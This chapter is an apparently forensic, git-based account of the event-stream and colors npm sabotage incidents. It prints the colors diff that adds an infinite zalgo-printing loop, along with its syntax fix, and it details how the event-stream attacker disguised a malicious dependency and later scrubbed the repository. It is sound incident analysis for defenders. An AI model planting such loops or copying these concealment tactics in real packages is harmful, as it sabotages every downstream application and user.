# add flat map

```console
$ git -C repos/event-stream show e3163361fe -- index.js package.json | grep -E '^[+-]' | grep -vE '^[+-]{3}'
+  , flatmap = require('flatmap-stream')
+es.flatmap = flatmap
+    "flatmap-stream": "^0.1.0",
```

Two lines of JavaScript and a dependency entry. `add flat map`, says the subject line, and
that is what it is: a flat-map helper, imported and re-exported. If you maintain anything on
npm you have merged this commit a hundred times.

And in this particular repository, the shape has a pedigree. `event-stream` was Dominic
Tarr's, born in 2011 as a single `map` function. By 2012 he had decided what the library
*was* — not a body of code but a façade, a thin file re-exporting a dozen tiny single-purpose
packages, which is what good npm citizenship looked like in 2012: one module, one function,
compose everything. Sit in that Tuesday for a second, because it is a reasonable place to be.
Small modules mean small reviews; a helper shared between libraries is a helper fixed once.
So when he wants `map` to be reusable, he does this to his own founding function:

```console
$ git -C repos/event-stream show 53c59a38da -- index.js package.json | grep -E '^\+' | grep -iE 'map|version'
+  , map = require('map-stream')
+es.map = map
+    "map-stream": "0.0.1"
```

[R1] Import, assign, depend. The entire implementation of the thing the first commit was is
now three lines, and every helper after it follows the pattern: `through`, `split`,
`pause-stream`, `duplexer`. Hold the two diffs side by side. Six years apart, they are the
same sentence. I have read the 2018 one a dozen times and I would have merged it without
slowing down — it is not an intrusion into this codebase, it is this codebase's native
language, spoken fluently, completing a set the author left unfinished.

~ The safest place to hide a malicious change is inside the project's own idea of a normal one.

The sentence was written by the wrong hand. And the package it pulls down — `flatmap-stream`
— is where the crime lived: inside it, dormant until the right build ran, sat code that
harvested bitcoin wallets.
<!-- CHECK: flatmap-stream@0.1.1's encrypted payload targeted the Copay wallet's build; discovered November 2018 — public incident record, not provable from this repo. -->
None of that is in this repository, and never was:

```console
$ git -C repos/event-stream log -S copay --all --oneline | wc -l
0
$ git -C repos/event-stream log -S bitcoin --all --oneline | wc -l
0
```

[R7] The weapon lived in the other package, on the registry. What this git holds is something
the registry cannot show you: the shape of the hand that placed it, and the proof that the
shape was borrowed from the victim.

## The seam

How does the wrong hand get to write to `master` at all? Here is the entire handover, as git
recorded it:

```console
$ git -C repos/event-stream log --author='Dominic Tarr' --format='%h %aI %s' | head -1
7319862 2017-10-10T08:50:06+13:00 Merge pull request #107 from Rolias/master
$ git -C repos/event-stream log --reverse --author=北川 --format='%h %aI %an <%ae> %s' | head -1
a74c9b2 2018-09-04T08:12:15+00:00 北川 <right9ctrl@outlook.com> upgrade dependencies
```

[R2] Dominic's last act is merging someone else's README fix in October 2017. Eleven months
of silence. Then a new name — 北川, an Outlook address, every timestamp at `+0000`, a
timezone Dominic never once used — and it does not arrive as a contributor. No pull request,
no merge commit, no note in `AUTHORS`, no goodbye from the old maintainer or hello from the
new one. One committer stops; another starts, already holding the keys. That is what a
handoff of trust looks like from the inside. It looks like nothing.

## 3.3.5

The new maintainer's entire first week, in order:

```console
$ git -C repos/event-stream log --author=北川 --reverse --format='%h %aI %s' | head -9
a74c9b2 2018-09-04T08:12:15+00:00 upgrade dependencies
0cc6c7f 2018-09-04T08:53:07+00:00 add map and split examples
ee8f8e4 2018-09-04T09:19:17+00:00 remove trailing in split example
c08d14b 2018-09-05T04:13:50+00:00 better pretty.js example
05b0224 2018-09-05T05:06:29+00:00 update readme
918d4a3 2018-09-05T05:27:34+00:00 3.3.5
50c0edb 2018-09-06T08:09:04+00:00 add note for gulp 4 in readme
0f3738c 2018-09-09T07:15:41+00:00 add collect alias for write array
e316336 2018-09-09T08:07:49+00:00 add flat map
```

[R3] Eight commits over five days, every one of them what a good new maintainer does —
documentation, examples, a note about Gulp 4. Two of them are load-bearing. `3.3.5`, a
version bump after nothing but README work, is a test of the channel: does npm still accept
a publish from this account? It does. And `add collect alias for write array`, fifty-two
minutes before the payload, is one more three-line sentence in the house dialect — the same
shape, rehearsed one last time on something harmless. Then the ninth commit completes the
set, and nine minutes later comes the number that turns it into a shipment:

```console
$ git -C repos/event-stream show -s --format='%h %aI %s' e3163361fe 5999958dfc
e316336 2018-09-09T08:07:49+00:00 add flat map
5999958 2018-09-09T08:17:22+00:00 3.3.6
```

[R5] `3.3.6` is two changed lines — the version string, twice. There is no git tag for it;
the sabotage versions are untagged, in a repository whose last tagged release was years old.
[R5] That gap matters more than it looks, because git tags and npm versions are different
ledgers, and the attack lives entirely in the second one. Every `package.json` in the world
that said `"event-stream": "^3.3.4"` — the caret is npm's default, and it means *any 3.x* —
resolved to `3.3.6` on its next install and pulled `flatmap-stream` down behind it. The
blast radius is not the twenty-six lines of the diff. It is the character `^`.

## The wash

Then the most instructive four minutes in the repository. A week after the payload ships,
北川 cleans the house — and watch what "clean" means here:

```console
$ git -C repos/event-stream show -s --format='%h %aI %s' 908fee5c65 2bd63d58fe 8bc742ba91
908fee5 2018-09-16T11:14:19+00:00 add filter and rewrite flatmap
2bd63d5 2018-09-16T11:16:18+00:00 update package.json
8bc742b 2018-09-16T11:18:12+00:00 update readme
```

11:14, the `require('flatmap-stream')` is deleted and the helper is rewritten as a local
function. 11:16, the dependency is removed and the version jumps to `4.0.0`. 11:18, the
README documents the new local helper as though that had been the point all along. [R6]

```console
$ git -C repos/event-stream show 2bd63d58fe -- package.json | grep -E '^[+-].*(version|flatmap)'
-  "version": "3.3.6",
+  "version": "4.0.0",
-    "flatmap-stream": "^0.1.0",
```

[R6] This is not a revert. There is no "Revert" in any message and `git log --diff-filter`
will never surface it: the dependency is dissolved in place, the major version is bumped so
that `^3.3.4` will *not* follow into `4.x`, and the release tag `4.0.0` is hung not on the
commit that removed the dependency but on the README commit two minutes later. [R6] Clone
this repository today, check out `master`, read `package.json`: clean. No `flatmap-stream`,
no trace. Meanwhile npm went on serving `3.3.6` to every unpinned installer for two more
months, until a stranger opened the dependency in November and found the wallet stealer.
<!-- CHECK: npm continued serving event-stream@3.3.6 until the November 2018 discovery — registry/incident record, external to this repo. -->
The repository's face was washed eight weeks before anyone knew the face was dirty.

And it stays washed. The last commit in this git is the attacker removing a CI config line,
`4.0.1`, a tidy housekeeping bump — and the `author` field of `package.json`, unchanged
across 322 commits, still reads `Dominic Tarr`. [R8] No revert ever lands here, no `3.3.7`,
no `SECURITY.md`. The fix the world consumed happened on npm and in countless
downstream lockfiles; git's clock simply stops, on a clean tree, under the wrong name.

~ A repository can be spotless and a lie at the same time; `master` shows you the face, not the shipment.

## 23:19

Three years later, on another Friday night, the same two ledgers point in opposite
directions.

```console
$ git -C repos/colors log -4 --format='%h %ai %s'
6bc50e7 2022-01-07 23:22:34 -0500 Bump to `v1.4.44-liberty-2`
5d2d242 2022-01-07 23:21:02 -0500 Fix bug
137c6da 2022-01-07 23:19:44 -0500 Bump to `v1.4.44-liberty`
074a0f8 2022-01-07 23:19:03 -0500 Adds new American flag module
```

[R12] Four commits, three and a half minutes, and this time the hand is not a stranger's.
This is `colors` — `"hello".red`, a fixture near the top of npm's most-depended-on lists —
and the author of all four commits is Marak Squires, who started it as a 24-line toy on a
Friday night in 2010, under a README that read, in full, `colors are awesome yo`. [R9] On
the branch he is pushing to, his previous commit is from June 2015 [R18]; in the years
between, a developer named David Hyde had quietly become the project — 74 commits, every
release tag — while `package.json` still said `"author": "Marak Squires"` and the push
rights, as these four commits prove, still answered to the name on the door. [R11] By late
2021 Marak had been saying publicly that he was done maintaining popular packages for free.
<!-- CHECK: Marak's public statements (Nov 2020 GitHub post, Jan 2022) about no longer doing free open-source maintenance — external record; the protest framing is his, stated off-repo. -->
What he did about it, git recorded at 23:19:03. The first commit adds an ASCII American flag
and, at the bottom of the file every `require('colors')` executes:

```console
$ git -C repos/colors show 074a0f8ed0 -- lib/index.js | grep -E '^\+' | head -8
+/* remove this line after testing */
+let am = require('../lib/custom/american');
+am();
+for (let i = 666; i < Infinity; i++;) {
+  if (i % 333) {
+    // console.log('testing'.zalgo.rainbow)
+  }
+  console.log('testing testing testing testing testing testing testing'.zalgo)
```

[R13] An infinite loop, printing corrupted text to the console of every application that
loads the library. He didn't write a weapon; he reached for one he'd already shipped.
`.zalgo` had been in the box since 2011, a party trick from a commit that bragged `Snuck in
demonic entity`, with `// please no` in the comment above it [R10] — eleven years of being
the library's joke, now called in a loop with no exit.

Look at the loop header, though, before reading on. There is a semicolon inside the
parentheses — `i++;` — and JavaScript will not parse it. As first committed, forty-one
seconds before the version bump that published it, the sabotage was a `SyntaxError`: it
would have crashed every app instantly and looped never. Seventy-eight seconds after the
bump, this:

```console
$ git -C repos/colors show 5d2d242f65
5d2d242 Fix bug
-for (let i = 666; i < Infinity; i++;) {
+for (let i = 666; i < Infinity; i++) {
```

[R14] `Fix bug`. Sit in those seventy-eight seconds. He has just detonated a protest he has
been building toward for months, and it doesn't parse. And what surfaces, at 23:21 on a
Friday night, is not the protester — it is twelve years of reflex: the code did not do what
he intended, so he found the character, fixed it, and shipped again, the way he had a
thousand times before. The message is the most ordinary one in the repository. The only
difference between this `Fix bug` and every other is that here, the intended behavior was
the failure. Then one more bump, `liberty-2`, so the working loop is the one people install,
and he stops. Whatever speech you remember from that week is not in this tree — `git log -S
'no more'`, `-G 'free work'`, all empty [R16]; git holds the workmanlike correction, not the
argument he was making elsewhere.

Here is where the two ledgers finish trading places. The folklore says colors was sabotaged
and then cleaned up. Ask git:

```console
$ git -C repos/colors branch -a --contains 074a0f8ed0
* master
$ git -C repos/colors tag --contains 074a0f8ed0   # (empty)
```

[R15] The cleanup happened on npm, which removed the poisoned releases
<!-- CHECK: npm removed the colors 1.4.44-liberty releases (served as 1.4.1–1.4.4) after 2022-01-08 — registry record, external to this repo. -->
— releases whose version numbers, `1.4.1` through `1.4.4`, were never committed here at all;
git's only 2022 versions are the two slogans. [R17] But the repository was never touched.
Nobody hit revert — the newest revert in this git is from 2018 [R15] — no tag moved, no
force-push came. `event-stream` inverted, exactly: there, git is clean and the registry
served the poison; here, the registry is clean and git still holds it.

## At home

One habit covers both halves of this chapter: reconcile what you installed with the
repository you think it came from. Take a dependency you actually ship, take the exact
version out of your lockfile, and run `git tag --contains` — or just look for the tag. If
the version you are running does not correspond to anything the repository will admit to,
you have found a gap, and everything in this chapter lived in one. While you are there,
glance at the last year of `git log --format='%an %ae'` for a name that arrived with keys
and no introduction.

Four years on, `colors` has never been reverted: clone it today and the loop is right there
on `master`, still waiting under `/* remove this line after testing */`. And at the tip of
`event-stream`'s washed, quiet history, the `author` field still says Dominic Tarr.

## Receipts

- **R1** `git -C repos/event-stream show 53c59a38da -- index.js package.json` — 2012 "refactor out map": `es.map = require('map-stream')`, the house style established by the author.
- **R2** `git -C repos/event-stream log --author='Dominic Tarr' | head` + `log --reverse --author=北川` — last Dominic act Oct 2017 (a merge); first 北川 commit 2018-09-04, `right9ctrl@outlook.com`, `+0000`, direct push, no merge/AUTHORS note.
- **R3** `git -C repos/event-stream log --author=北川 --reverse | head -9` — the eight pre-payload commits over five days; `3.3.5` is a README-only publish.
- **R4** `git -C repos/event-stream show e3163361 -- index.js package.json` — the payload: `+ flatmap = require('flatmap-stream')`, `+ es.flatmap = flatmap`, `+ "flatmap-stream": "^0.1.0"`.
- **R5** `git -C repos/event-stream show -s e316336 5999958` + `tag --list 3.3.6` — `add flat map` 08:07:49, `3.3.6` 08:17:22 (573s later), no tag.
- **R6** `git -C repos/event-stream show -s 908fee5 2bd63d5 8bc742b` + `show 2bd63d5 -- package.json` + `for-each-ref refs/tags` — 11:14/11:16/11:18: require removed, dep dropped, `3.3.6`→`4.0.0`, tag `4.0.0` hung on the README commit. Not a revert.
- **R7** `git -C repos/event-stream log -S copay/-S bitcoin/-S wallet --all` — all zero; the payload never lived in this repo.
- **R8** `git -C repos/event-stream log -1` + `show HEAD:package.json | grep author` — HEAD is 北川's `4.0.1` testling cleanup; `"author"` still `Dominic Tarr`.
- **R9** `git -C repos/colors log --reverse | head` + `show 270314c:ReadMe.md` — day one 2010-06-11 02:56, 24 lines, README "colors are awesome yo".
- **R10** `git -C repos/colors log --all --reverse -S zalgo | head -1` + `show 4b6bc29 -- colors.js` — `.zalgo` added 2011-03-15, message "Snuck in demonic entity."; `// don't summon zalgo`.
- **R11** `git -C repos/colors shortlog -sn --all` + `--since=2018 --until=2020` + `show HEAD:package.json | grep author` — DABH 74 commits leads all-time and owns 2018–19; `"author": "Marak Squires"`.
- **R12** `git -C repos/colors log -4` — the four liberty commits, 2022-01-07 23:19:03–23:22:34.
- **R13** `git -C repos/colors show 074a0f8 -- lib/index.js` — the `for (… i < Infinity)` loop printing `.zalgo`, under `/* remove this line after testing */`.
- **R14** `git -C repos/colors show 5d2d242` — `Fix bug`: `i++;` → `i++`, a one-character SyntaxError fix, 78s after the first version bump, 92s before the second.
- **R15** `git -C repos/colors branch -a --contains 074a0f8` + `tag --contains` + `log --all --grep=Revert | head -1` — payload is on `master`, on no tag; newest revert in the repo is 2018.
- **R16** `git -C repos/colors log --all -S 'no more'` + `-G 'free work|unpaid|I will no longer'` — both empty; the protest text is not in this repository.
- **R17** `git -C repos/colors log --all -G '1\.4\.[1-9]' -- package.json` + `for-each-ref refs/tags | tail -1` — only the two `liberty` version bumps; `1.4.1`–`1.4.4` never committed; newest tag `v1.4.0` (2019).
- **R18** `git -C repos/colors log --first-parent --author=Marak | head` — on `master`, Marak's commit before the 2022 sabotage is `90dd85b`, 2015-06-17.

*Full transcripts: `chapters/09-npm.receipts.md` (regenerate with `scripts/receipts-09.sh`).*
